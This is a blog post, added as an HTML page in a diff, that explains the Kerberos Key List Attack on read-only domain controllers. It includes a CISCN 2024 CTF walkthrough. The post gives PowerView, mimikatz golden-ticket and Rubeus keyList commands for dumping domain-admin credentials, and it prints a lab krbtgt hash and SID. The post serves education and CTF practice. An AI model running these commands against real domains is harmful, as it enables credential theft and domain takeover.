@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="s3ven&#39;s blog" />
+  
+  
+  
+  <title>
+    
+      Kerberos 中针对 RODC 的 Key List Attack 分析 
+      
+      
+      |
+    
+     s3ven&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Kerberos 中针对 RODC 的 Key List Attack 分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+          2024-08-05
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="../../categories/skill/" title="Skill">
+                    Skill
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/pentest/" title="Pentest">
+                    #Pentest
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/kerberos/" title="Kerberos">
+                    #Kerberos
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>在 Kerberos 认证系统中，Key List Attack 是一种相对较新的攻击手段，主要针对只读域控制器（RODC）。这种攻击通过利用 Kerberos 协议中的特定扩展来实现，其核心在于请求和获取存储在 KDC 中的加密密钥信息。</p>
+<h2 id="Kerberos-协议"><a href="#Kerberos-协议" class="headerlink" title="Kerberos 协议"></a>Kerberos 协议</h2><p>Kerberos 协议是一种基于票据的认证协议，允许节点在不安全网络中安全地证明其身份。Kerberos 的核心是 KDC，它负责发放和管理票据（Ticket-Granting Ticket，TGT）和服务票据（Service Ticket，ST）。本文不涉及 Kerberos 协议的基本原理，不熟悉 Kerberos 认证流程的读者，请先阅读 <a href="https://xz.aliyun.com/t/8187">https://xz.aliyun.com/t/8187</a> 学习相关内容。</p>
+<h2 id="RODC-特性"><a href="#RODC-特性" class="headerlink" title="RODC 特性"></a>RODC 特性</h2><p>RODC 是一种特殊类型的域控制器，设计用于提高安全性和降低在安全级别较低的物理位置中的风险。RODC 不存储用户或其他帐户的密码哈希值；相反，它从完全域控制器（RWDC）请求所需的认证信息。RODC 对于存储敏感凭据的能力有严格限制，通过 <code>msDS-RevealOnDemandGroup</code> 和 <code>msDS-NeverRevealGroup</code> 控制这些限制。</p>
+<ul>
+<li><p>msDS-RevealOnDemandGroup<br>该属性作为一个安全组，它列出了那些可以在需求时由 RODC 请求其凭证的用户或计算机帐户。只有当这些帐户的验证请求被转发到 RODC 时，这些帐户的密码散列才会从主域控制器被请求并缓存在 RODC 上。此举措确保了 RODC 只存储那些可能需要频繁验证但不需要高安全级别保护的帐户凭据。</p>
+</li>
+<li><p>msDS-NeverRevealGroup<br>与 msDS-RevealOnDemandGroup 相对，该属性指定了一组帐户，其凭据即使是在请求时也决不应该被 RODC 请求或存储。这通常包括高权限帐户，如域管理员等。这一设置是为了防止在 RODC 遭到攻击时，攻击者能够获得对这些高权重帐户的控制。</p>
+</li>
+</ul>
+<h2 id="Key-List-Request"><a href="#Key-List-Request" class="headerlink" title="Key List Request"></a>Key List Request</h2><p>在 Kerberos 协议中，Key List Request 是一种扩展请求，用于从密钥分发中心（KDC）获取一系列加密密钥，这些密钥与特定账户关联，并用于多种加密任务。这种请求特别在只读域控制器（RODC）环境中有其实际应用，因为 RODC 不存储所有用户的完整密钥信息，而是根据需要从全域控制器（RWDC）请求这些信息。</p>
+<p>当客户端需要与服务进行安全通信时，它会发送一个包含 <code>KERB-KEY-LIST-REQ</code> padata 类型的 TGS-REQ （票据授权服务请求）消息到 KDC。这个请求指示 KDC 返回一系列支持的加密类型的密钥。KDC 响应这个请求，通过在 TGS-REP （票据授权服务响应）消息中包含 <code>KERB-KEY-LIST-REP</code> 结构，该结构嵌入在加密的 EncKDCRepPart 结构体中。这些返回的密钥信息通常用于兼容旧版本或特定加密需求。</p>
+<pre class="language-none"><code class="language-none">KERB-KEY-LIST-REQ ::&#x3D; SEQUENCE OF Int32 -- encryption type -- 
+KERB-KEY-LIST-REP ::&#x3D; SEQUENCE OF EncryptionKey</code></pre>
+
+<h2 id="Key-List-Attack"><a href="#Key-List-Attack" class="headerlink" title="Key List Attack"></a>Key List Attack</h2><h3 id="1-RODC-管理权限的获取"><a href="#1-RODC-管理权限的获取" class="headerlink" title="1. RODC 管理权限的获取"></a>1. RODC 管理权限的获取</h3><p>首先攻击者需要获取对 RODC 的管理权限，这可以通过 PowerSploit 项目的 PowerView.ps1 修改 RODC 对象的 ManagedBy 属性实现，将其设置为攻击者控制的账户，这样攻击者就可以直接登入并管理 RODC：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'managedBy'</span>=<span class="token string">'CN=Hacker,CN=Users,DC=example,DC=com'</span><span class="token punctuation">&#125;</span></code></pre>
+
+<h3 id="2-修改安全组策略"><a href="#2-修改安全组策略" class="headerlink" title="2. 修改安全组策略"></a>2. 修改安全组策略</h3><p>一旦控制了 RODC，攻击者可以修改关键的 Active Directory 属性，包括 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup。通过这种修改，攻击者可以配置 RODC 来缓存并揭示通常不应被揭示的高权限用户凭证。</p>
+<p>首先通过 PowerView.ps1 清空 msDS-NeverRevealGroup 属性：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span>Clear <span class="token string">'msDS-NeverRevealGroup'</span></code></pre>
+
+<p>再通过 PowerView.ps1 将域管理员添加到 msDS-RevealOnDemandGroup 属性中：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msDS-RevealOnDemandGroup'</span>=@<span class="token punctuation">(</span><span class="token string">'CN=Administrator,CN=Users,DC=example,DC=com'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre>
+
+<h3 id="3-利用-Key-List-Request"><a href="#3-利用-Key-List-Request" class="headerlink" title="3. 利用 Key List Request"></a>3. 利用 Key List Request</h3><p>在 RODC 中配置完毕后，攻击者可以发起特定的 Key List Request，强制 RODC 从 RWDC 请求并获取目标高权限账户的密钥信息。通过为域管理员用户伪造黄金票据，来包含请求特定账户密钥的 KERB-KEY-LIST-REQ：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取域信息</span>
+mimikatz.exe <span class="token string">"Log"</span> <span class="token string">"Privilege::Debug"</span> <span class="token string">"lsadump::lsa /patch"</span> <span class="token string">"exit"</span>
+
+<span class="token comment"># 构造域管理员的黄金票据</span>
+mimikatz.exe kerberos::golden /admin:Administrator /domain:example.com /sid:sid /krbtgt:hash /ticket:ticket.kirbi
+
+<span class="token comment"># 请求 Key List</span>
+Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/example.com /dc:dc.example.com /ticket:base64</code></pre>
+
+<p>获取域管理员用户的哈希值后，攻击者可以用它来解密服务票据或其他敏感数据，甚至可能用它来伪造新的票据，进一步在网络中移动，提升权限，或执行其他恶意行为。</p>
+<h2 id="赛题举例"><a href="#赛题举例" class="headerlink" title="赛题举例"></a>赛题举例</h2><p>CISCN 2024 Final 渗透部分 DC Challenge</p>
+<p><img src="image-1.png" alt="alt text"></p>
+<p>首先可从 WIN-OPS88 中获得 ROAdmins.xlsx 敏感文件，其中包含 RODC 的管理员账号密码，从而可以获得 RODC 的远程桌面</p>
+<p><img src="image-2.png" alt="alt text"></p>
+<p>使用 RODC 管理员账号密码连接远程桌面 RODC.vertexsoft.local</p>
+<p><img src="image-3.png" alt="alt text"></p>
+<p>获取对 RODC 的管理权限：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'managedBy'</span>=<span class="token string">'CN=lsabellaTech,CN=Users,DC=vertex,DC=local'</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>执行 <code>net user /domain</code> 发现可以枚举域内用户，表明现在具有 RODC 管理员权限：</p>
+<p><img src="image-4.png" alt="alt text"></p>
+<p>但此时没有访问 DC 文件系统的权限：</p>
+<p><img src="image-5.png" alt="alt text"></p>
+<p>获取域信息：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"Log"</span> <span class="token string">"Privilege::Debug"</span> <span class="token string">"lsadump::lsa /patch"</span> <span class="token string">"exit"</span></code></pre>
+
+<p><img src="image-6.png" alt="alt text"></p>
+<p><img src="image-7.png" alt="alt text"></p>
+<p>获得信息如下：</p>
+<pre class="language-none"><code class="language-none">domain：vertexsoft.local
+sid：S-1-5-21-1670446094-1728415802-1380520873
+krbtgt Hash NTLM：34e335179246ef930dc33fd1e3de6e9e</code></pre>
+
+<p>清空 msDS-NeverRevealGroup 属性：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span>Clear <span class="token string">'msDS-NeverRevealGroup'</span></code></pre>
+
+<p>将域管理员添加到 msDS-RevealOnDemandGroup 属性中：</p>
+<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1
+
+<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msDS-RevealOnDemandGroup'</span>=@<span class="token punctuation">(</span><span class="token string">'CN=Administrator,CN=Users,DC=vertex,DC=local'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>完成黄金票据构造：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe kerberos::golden /admin:Administrator /domain:vertexsoft.local /sid:S-1-5-21-1670446094-1728415802-1380520873 /krbtgt:34e335179246ef930dc33fd1e3de6e9e /ticket:ticket.kirbi</code></pre>
+
+<p><img src="image-8.png" alt="alt text"></p>
+<p>发起 Key List Request：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertex.local /dc:DC.vertex.local /ticket:base64</code></pre>
+
+<p>最后通过哈希传递获得 DC 权限拿到 flag</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="../cve-2024-37704-mysql-connector-java-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="../../write-up/2025-suctf-writeup/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RODC-%E7%89%B9%E6%80%A7"><span class="toc-text">RODC 特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-List-Request"><span class="toc-text">Key List Request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-List-Attack"><span class="toc-text">Key List Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-RODC-%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-text">1. RODC 管理权限的获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%AE%89%E5%85%A8%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-text">2. 修改安全组策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-Key-List-Request"><span class="toc-text">3. 利用 Key List Request</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E9%A2%98%E4%B8%BE%E4%BE%8B"><span class="toc-text">赛题举例</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2025 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
